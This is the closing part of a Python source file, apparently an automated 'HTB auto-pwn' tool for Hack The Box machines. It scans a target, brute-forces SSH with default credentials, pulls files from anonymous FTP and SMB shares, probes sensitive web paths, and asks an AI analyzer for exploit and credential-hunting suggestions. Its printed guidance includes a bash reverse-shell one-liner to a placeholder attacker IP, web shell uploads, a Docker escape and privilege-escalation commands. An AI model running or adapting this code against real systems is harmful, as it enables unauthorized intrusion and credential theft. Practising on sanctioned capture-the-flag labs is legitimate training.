        if self.ai_analyzer and self.ai_analyzer.enabled:
            self._get_ai_credential_suggestions(vuln)
        
        logger.info("")  # Empty line for spacing
    
    def _get_ai_credential_suggestions(self, vuln: Dict):
        """Get AI suggestions for finding credentials"""
        try:
            prompt = f"""Based on the following vulnerability, suggest specific credential hunting strategies:

Vulnerability: {vuln.get('type')}
Port: {vuln.get('port')}
Service: {vuln.get('service', 'unknown')}
Version: {vuln.get('version', 'unknown')}

Provide specific commands and locations to search for credentials."""

            logger.info(f"{Colors.OKCYAN}🤖 Getting AI credential hunting suggestions...{Colors.ENDC}")
            response = self.ai_analyzer.analyze(prompt, context_type="credential_hunting")
            
            if response:
                logger.info(f"{Colors.BOLD}AI Credential Hunting Suggestions:{Colors.ENDC}")
                logger.info(response)
        except Exception as e:
            logger.debug(f"AI credential suggestions failed: {e}")
    
    def _display_access_methods(self, vuln: Dict):
        """Display methods to gain initial access"""
        vuln_type = vuln.get('type')
        port = vuln.get('port')
        
        logger.info(f"\n{Colors.BOLD}🚪 Access Methods for {vuln_type} (Port {port}):{Colors.ENDC}")
        
        if vuln_type == 'ftp_anonymous':
            logger.info(f"{Colors.OKCYAN}Initial Access via FTP:{Colors.ENDC}")
            logger.info(f"  • Download all accessible files: lftp -e 'mirror; quit' -u anonymous, {self.target}")
            logger.info(f"  • Upload web shell if writable: put shell.php")
            logger.info(f"  • Check for writable web directories")
            
        elif vuln_type == 'ssh':
            logger.info(f"{Colors.OKCYAN}Initial Access via SSH:{Colors.ENDC}")
            logger.info(f"  • Use found credentials: ssh user@{self.target} -p {port}")
            logger.info(f"  • Use private key: ssh -i id_rsa user@{self.target} -p {port}")
            logger.info(f"  • Exploit SSH version vulnerabilities")
            
        elif vuln_type == 'web':
            logger.info(f"{Colors.OKCYAN}Initial Access via Web:{Colors.ENDC}")
            logger.info(f"  • Upload web shell through file upload")
            logger.info(f"  • Exploit RCE vulnerabilities")
            logger.info(f"  • SQL injection to webshell")
            logger.info(f"  • Use reverse shell: bash -i >& /dev/tcp/YOUR_IP/4444 0>&1")
            
        elif vuln_type == 'smb':
            logger.info(f"{Colors.OKCYAN}Initial Access via SMB:{Colors.ENDC}")
            logger.info(f"  • Mount share: mount -t cifs //{self.target}/share /mnt")
            logger.info(f"  • Use psexec: psexec.py user:pass@{self.target}")
            logger.info(f"  • Exploit SMB vulnerabilities: EternalBlue, etc.")
        
        logger.info("")
    
    def _display_privesc_options(self, vuln: Dict):
        """Display privilege escalation options after initial access"""
        vuln_type = vuln.get('type')
        
        logger.info(f"\n{Colors.BOLD}⬆️  Privilege Escalation Options:{Colors.ENDC}")
        logger.info(f"{Colors.OKCYAN}Enumeration:{Colors.ENDC}")
        logger.info(f"  • Linux: linpeas.sh, LinEnum.sh")
        logger.info(f"  • Windows: winPEAS.exe, PowerUp.ps1")
        logger.info(f"  • Check sudo: sudo -l")
        logger.info(f"  • Check SUID: find / -perm -4000 2>/dev/null")
        logger.info(f"  • Check capabilities: getcap -r / 2>/dev/null")
        
        logger.info(f"\n{Colors.OKCYAN}Common Vectors:{Colors.ENDC}")
        logger.info(f"  • Kernel exploits: uname -a, searchsploit kernel")
        logger.info(f"  • Writable /etc/passwd: openssl passwd -1 -salt salt pass")
        logger.info(f"  • Cron jobs: cat /etc/crontab")
        logger.info(f"  • Docker escape: docker run -v /:/mnt --rm -it alpine chroot /mnt")
        logger.info(f"  • Path hijacking: echo $PATH")
        
        logger.info("")
    
    def _exploit_ftp_anonymous(self, port: int):
        """Exploit anonymous FTP access"""
        logger.info(f"{Colors.WARNING}Attempting FTP anonymous exploitation on port {port}{Colors.ENDC}")
        try:
            # Use lftp to connect and download files
            commands = f"open -u anonymous, {self.target}:{port}; ls; find; bye"
            result = subprocess.run(
                ['lftp', '-c', commands],
                capture_output=True, timeout=60, text=True
            )
            
            self._extract_flags_from_output(result.stdout, 'FTP')
        except Exception as e:
            logger.debug(f"FTP exploitation failed: {e}")
    
    def _exploit_ssh(self, port: int, vuln: Dict):
        """Attempt SSH exploitation"""
        logger.info(f"{Colors.WARNING}Checking SSH on port {port}{Colors.ENDC}")
        
        # Try common credentials
        common_creds = [
            ('root', 'root'),
            ('admin', 'admin'),
            ('user', 'user'),
            ('htb', 'htb')
        ]
        
        for username, password in common_creds:
            try:
                result = subprocess.run(
                    ['sshpass', '-p', password, 'ssh', '-o', 'StrictHostKeyChecking=no',
                     '-o', 'ConnectTimeout=5', f'{username}@{self.target}', '-p', str(port),
                     'cat /root/flag.txt /home/*/flag.txt /flag.txt 2>/dev/null || echo "No flag"'],
                    capture_output=True, timeout=10, text=True
                )
                
                if 'flag' in result.stdout.lower() or 'htb{' in result.stdout.lower():
                    self._extract_flags_from_output(result.stdout, 'SSH')
                    break
            except Exception as e:
                logger.debug(f"SSH attempt with {username}:{password} failed: {e}")
    
    def _exploit_web(self, port: int):
        """Exploit web vulnerabilities"""
        logger.info(f"{Colors.WARNING}Attempting web exploitation on port {port}{Colors.ENDC}")
        
        # Try to access common flag locations
        protocol = 'https' if port == 443 else 'http'
        base_url = f"{protocol}://{self.target}:{port}"
        
        paths = [
            '/flag.txt',
            '/flag',
            '/root.txt',
            '/user.txt',
            '/.git/HEAD',
            '/admin',
            '/robots.txt',
            '/.env'
        ]
        
        for path in paths:
            try:
                result = subprocess.run(
                    ['curl', '-k', '-s', '--max-time', '5', f'{base_url}{path}'],
                    capture_output=True, timeout=10, text=True
                )
                
                self._extract_flags_from_output(result.stdout, f'WEB:{path}')
            except Exception as e:
                logger.debug(f"Web path {path} failed: {e}")
        
        # Try directory bruteforcing
        self._web_directory_bruteforce(base_url)
    
    def _web_directory_bruteforce(self, base_url: str):
        """Bruteforce web directories"""
        try:
            result = subprocess.run(
                ['gobuster', 'dir', '-u', base_url, '-w', 
                 '/usr/share/wordlists/dirb/common.txt', '-t', '20', '-q', '--timeout', '30s'],
                capture_output=True, timeout=60, text=True
            )
            
            # Check discovered directories for flags
            for line in result.stdout.split('\n'):
                if 'Status: 200' in line:
                    match = re.search(r'(/\S+)', line)
                    if match:
                        path = match.group(1)
                        try:
                            content_result = subprocess.run(
                                ['curl', '-k', '-s', '--max-time', '5', f'{base_url}{path}'],
                                capture_output=True, timeout=10, text=True
                            )
                            self._extract_flags_from_output(content_result.stdout, f'WEB:{path}')
                        except:
                            pass
        except Exception as e:
            logger.debug(f"Directory bruteforce failed: {e}")
    
    def _exploit_smb(self, port: int):
        """Exploit SMB vulnerabilities"""
        logger.info(f"{Colors.WARNING}Attempting SMB exploitation on port {port}{Colors.ENDC}")
        
        # List shares
        try:
            result = subprocess.run(
                ['smbclient', '-L', f'//{self.target}', '-N'],
                capture_output=True, timeout=30, text=True
            )
            
            # Try to access shares
            shares = re.findall(r'^\s+(\S+)\s+Disk', result.stdout, re.MULTILINE)
            
            for share in shares:
                try:
                    share_result = subprocess.run(
                        ['smbclient', f'//{self.target}/{share}', '-N', '-c', 
                         'ls; get flag.txt /tmp/smb_flag.txt; get root.txt /tmp/smb_root.txt'],
                        capture_output=True, timeout=30, text=True
                    )
                    
                    self._extract_flags_from_output(share_result.stdout, f'SMB:{share}')
                    
                    # Check downloaded files
                    for tmp_file in ['/tmp/smb_flag.txt', '/tmp/smb_root.txt']:
                        if os.path.exists(tmp_file):
                            with open(tmp_file, 'r') as f:
                                self._extract_flags_from_output(f.read(), f'SMB:{share}')
                except:
                    pass
        except Exception as e:
            logger.debug(f"SMB exploitation failed: {e}")
    
    def _extract_flags_from_output(self, output: str, source: str):
        """Extract flags from command output"""
        # Common HTB flag patterns
        patterns = [
            r'[a-f0-9]{32}',  # MD5-like hashes
            r'HTB\{[^\}]+\}',  # HTB{...} format
            r'flag\{[^\}]+\}',  # flag{...} format
            r'[a-f0-9]{64}',  # SHA256-like hashes
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, output, re.IGNORECASE)
            for match in matches:
                if match not in self.flags:
                    logger.info(f"{Colors.OKGREEN}[FLAG FOUND] {source}: {match}{Colors.ENDC}")
                    self.flags.append({
                        'flag': match,
                        'source': source,
                        'timestamp': datetime.now().isoformat()
                    })


class HTBAutoPwn:
    """Main orchestration class"""
    
    def __init__(self, target: str, output_file: Optional[str] = None, use_ai: bool = True, verbose: bool = False):
        self.target = target
        self.output_file = output_file or f'htb_results_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        self.use_ai = use_ai
        self.verbose = verbose
        # Initialize AI analyzer by default
        self.ai_analyzer = AIAnalyzer(verbose=verbose) if use_ai else None
        # Store AI-driven decisions for dynamic phase execution
        self.ai_decisions = {}
        self.results = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'scan_results': {},
            'vulnerabilities': [],
            'flags': [],
            'ai_analysis': {},
            'exploit_suggestions': {}
        }
    
    def run(self):
        """Main execution flow"""
        logger.info(f"{Colors.HEADER}{Colors.BOLD}╔══════════════════════════════════════════════╗{Colors.ENDC}")
        logger.info(f"{Colors.HEADER}{Colors.BOLD}║   HTB Automated Flag Reveal System          ║{Colors.ENDC}")
        logger.info(f"{Colors.HEADER}{Colors.BOLD}║   Target: {self.target:<30} ║{Colors.ENDC}")
        logger.info(f"{Colors.HEADER}{Colors.BOLD}╚══════════════════════════════════════════════╝{Colors.ENDC}")
        
        # Phase 1: Network Scanning
        logger.info(f"\n{Colors.BOLD}[PHASE 1] Network Scanning{Colors.ENDC}")
        scanner = NetworkScanner(self.target, self.ai_analyzer)
        
        quick_results = scanner.quick_scan()
        if not quick_results or not quick_results.get('ports'):
            logger.error(f"{Colors.FAIL}No open ports found. Exiting.{Colors.ENDC}")
            return
        
        open_ports = [p['port'] for p in quick_results.get('ports', [])]
        logger.info(f"{Colors.OKGREEN}Open ports found: {open_ports}{Colors.ENDC}")
        
        detailed_results = scanner.detailed_scan(open_ports)
        self.results['scan_results'] = detailed_results
        
        # AI Analysis of scan results
        if self.ai_analyzer and self.ai_analyzer.enabled:
            logger.info(f"\n{Colors.BOLD}[PHASE 1.5] AI-Powered Analysis{Colors.ENDC}")
            ai_analysis = self.ai_analyzer.analyze_scan_results(detailed_results)
            self.results['ai_analysis'] = ai_analysis
            
            # Perform dynamic targeted scans based on AI recommendations
            if ai_analysis.get('priority_ports'):
                targeted_results = scanner.dynamic_targeted_scan(open_ports, ai_analysis)
                self.results['targeted_scans'] = targeted_results
        
        # Phase 2: Vulnerability Detection
        logger.info(f"\n{Colors.BOLD}[PHASE 2] Vulnerability Detection{Colors.ENDC}")
        detector = VulnerabilityDetector(detailed_results)
        vulnerabilities = detector.analyze()
        self.results['vulnerabilities'] = vulnerabilities
        
        # Add AI-identified vulnerabilities
        if self.results.get('ai_analysis', {}).get('vulnerabilities'):
            logger.info(f"{Colors.OKCYAN}AI-identified potential vulnerabilities:{Colors.ENDC}")
            for vuln in self.results['ai_analysis']['vulnerabilities'][:5]:
                logger.info(f"  • {vuln}")
        
        logger.info(f"{Colors.OKGREEN}Found {len(vulnerabilities)} potential vulnerabilities{Colors.ENDC}")
        for vuln in vulnerabilities:
            logger.info(f"  - {vuln.get('type')} on port {vuln.get('port')} (Severity: {vuln.get('severity')})")
        
        # Get AI exploit suggestions for each vulnerability
        if self.ai_analyzer and self.ai_analyzer.enabled and vulnerabilities:
            logger.info(f"\n{Colors.BOLD}[PHASE 2.5] AI Exploit Analysis{Colors.ENDC}")
            logger.info(f"{Colors.OKCYAN}Getting exploit suggestions for {len(vulnerabilities)} vulnerabilities...{Colors.ENDC}\n")
            
            for vuln in vulnerabilities:
                vuln_key = f"{vuln.get('type')}_{vuln.get('port')}"
                exploit_suggestions = self.ai_analyzer.suggest_exploits_for_vulnerability(vuln, self.target)
                self.results['exploit_suggestions'][vuln_key] = exploit_suggestions
        
        # Phase 3: Exploitation
        logger.info(f"\n{Colors.BOLD}[PHASE 3] Exploitation{Colors.ENDC}")
        
        # Get AI exploitation strategy
        if self.ai_analyzer and self.ai_analyzer.enabled and vulnerabilities:
            exploitation_strategy = self.ai_analyzer.suggest_exploitation_strategy(vulnerabilities, self.target)
            if exploitation_strategy.get('exploitation_order'):
                logger.info(f"{Colors.OKCYAN}🎯 AI-recommended exploitation order:{Colors.ENDC}")
                for idx, item in enumerate(exploitation_strategy['exploitation_order'][:3], 1):
                    logger.info(f"  {idx}. {item}")
            self.results['exploitation_strategy'] = exploitation_strategy
        
        exploiter = Exploiter(self.target, vulnerabilities, self.ai_analyzer)
        flags = exploiter.exploit()
        self.results['flags'] = flags
        
        # Save results
        self._save_results()
        
        # Summary
        self._print_summary()
    
    def _save_results(self):
        """Save results to JSON file"""
        try:
            with open(self.output_file, 'w') as f:
                json.dump(self.results, f, indent=2)
            logger.info(f"\n{Colors.OKGREEN}Results saved to: {self.output_file}{Colors.ENDC}")
        except Exception as e:
            logger.error(f"Failed to save results: {e}")
    
    def _print_summary(self):
        """Print execution summary"""
        logger.info(f"\n{Colors.HEADER}{Colors.BOLD}╔══════════════════════════════════════════════╗{Colors.ENDC}")
        logger.info(f"{Colors.HEADER}{Colors.BOLD}║             EXECUTION SUMMARY                ║{Colors.ENDC}")
        logger.info(f"{Colors.HEADER}{Colors.BOLD}╚══════════════════════════════════════════════╝{Colors.ENDC}")
        
        logger.info(f"\n{Colors.OKBLUE}Target:{Colors.ENDC} {self.target}")
        logger.info(f"{Colors.OKBLUE}Open Ports:{Colors.ENDC} {len(self.results['scan_results'].get('ports', []))}")
        logger.info(f"{Colors.OKBLUE}Vulnerabilities:{Colors.ENDC} {len(self.results['vulnerabilities'])}")
        logger.info(f"{Colors.OKBLUE}Flags Found:{Colors.ENDC} {len(self.results['flags'])}")
        
        if self.results['flags']:
            logger.info(f"\n{Colors.OKGREEN}{Colors.BOLD}FLAGS DISCOVERED:{Colors.ENDC}")
            for flag_info in self.results['flags']:
                logger.info(f"  {Colors.OKGREEN}✓{Colors.ENDC} {flag_info['flag']} (from {flag_info['source']})")
        else:
            logger.info(f"\n{Colors.WARNING}No flags found automatically. Manual exploitation may be required.{Colors.ENDC}")


def main():
    parser = argparse.ArgumentParser(
        description='HTB Automated Flag Reveal System',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python3 htb_auto_pwn.py -t 10.10.10.100
  python3 htb_auto_pwn.py -t 10.10.10.100 -o results.json
  python3 htb_auto_pwn.py -t target.htb -v
        '''
    )
    
    parser.add_argument('-t', '--target', required=True, help='Target IP address or hostname')
    parser.add_argument('-o', '--output', help='Output file for results (JSON)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--no-ai', action='store_true', help='Disable AI-powered analysis (AI is enabled by default)')
    parser.add_argument('--ai', action='store_true', help='Force enable AI (default behavior, kept for backwards compatibility)')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Check for required tools
    required_tools = ['nmap', 'nikto', 'gobuster', 'smbclient', 'curl', 'sshpass', 'lftp']
    missing_tools = []
    
    for tool in required_tools:
        try:
            subprocess.run(['which', tool], capture_output=True, check=True)
        except:
            missing_tools.append(tool)
    
    if missing_tools:
        logger.warning(f"{Colors.WARNING}Missing tools detected: {', '.join(missing_tools)}{Colors.ENDC}")
        logger.warning(f"{Colors.WARNING}Some functionality may be limited without these tools.{Colors.ENDC}")
        
        # Prompt user to install missing tools
        try:
            response = input(f"\n{Colors.OKBLUE}Would you like to install missing tools now? (y/n): {Colors.ENDC}").strip().lower()
            
            if response == 'y' or response == 'yes':
                logger.info(f"{Colors.OKBLUE}Installing missing tools...{Colors.ENDC}")
                
                # Check if running with sudo privileges
                if os.geteuid() != 0:
                    logger.warning(f"{Colors.WARNING}Installation requires root privileges.{Colors.ENDC}")
                    logger.info(f"{Colors.OKBLUE}Attempting to use sudo...{Colors.ENDC}")
                
                try:
                    # Update package list first
                    logger.info(f"{Colors.OKBLUE}Updating package list...{Colors.ENDC}")
                    update_cmd = ['sudo', 'apt-get', 'update'] if os.geteuid() != 0 else ['apt-get', 'update']
                    subprocess.run(update_cmd, check=True)
                    
                    # Install missing tools
                    install_cmd = ['sudo', 'apt-get', 'install', '-y'] if os.geteuid() != 0 else ['apt-get', 'install', '-y']
                    install_cmd.extend(missing_tools)
                    
                    logger.info(f"{Colors.OKBLUE}Installing: {', '.join(missing_tools)}{Colors.ENDC}")
                    result = subprocess.run(install_cmd, check=True)
                    
                    logger.info(f"{Colors.OKGREEN}✓ Successfully installed missing tools!{Colors.ENDC}")
                    
                    # Verify installation
                    still_missing = []
                    for tool in missing_tools:
                        try:
                            subprocess.run(['which', tool], capture_output=True, check=True)
                        except:
                            still_missing.append(tool)
                    
                    if still_missing:
                        logger.warning(f"{Colors.WARNING}Failed to install: {', '.join(still_missing)}{Colors.ENDC}")
                        logger.warning(f"{Colors.WARNING}Please install manually: sudo apt-get install {' '.join(still_missing)}{Colors.ENDC}")
                    
                except subprocess.CalledProcessError as e:
                    logger.error(f"{Colors.FAIL}Installation failed: {e}{Colors.ENDC}")
                    logger.error(f"{Colors.FAIL}Please install manually: sudo apt-get install {' '.join(missing_tools)}{Colors.ENDC}")
                    response = input(f"\n{Colors.WARNING}Continue anyway? (y/n): {Colors.ENDC}").strip().lower()
                    if response != 'y' and response != 'yes':
                        logger.info("Exiting...")
                        return
                except PermissionError:
                    logger.error(f"{Colors.FAIL}Permission denied. Please run with sudo or install tools manually.{Colors.ENDC}")
                    response = input(f"\n{Colors.WARNING}Continue anyway? (y/n): {Colors.ENDC}").strip().lower()
                    if response != 'y' and response != 'yes':
                        logger.info("Exiting...")
                        return
            else:
                logger.info(f"{Colors.OKBLUE}Continuing without installing missing tools...{Colors.ENDC}")
                response = input(f"\n{Colors.WARNING}Continue with limited functionality? (y/n): {Colors.ENDC}").strip().lower()
                if response != 'y' and response != 'yes':
                    logger.info("Exiting...")
                    return
        
        except KeyboardInterrupt:
            logger.info(f"\n{Colors.WARNING}Operation cancelled by user.{Colors.ENDC}")
            return
    
    # Determine if AI should be used (enabled by default, unless --no-ai is specified)
    use_ai = not args.no_ai
    
    if args.no_ai:
        logger.info(f"{Colors.WARNING}AI mode disabled by user. Running in standard mode.{Colors.ENDC}")
    
    # Run the automation
    autopwn = HTBAutoPwn(args.target, args.output, use_ai=use_ai, verbose=args.verbose)
    autopwn.run()


if __name__ == '__main__':
    main()
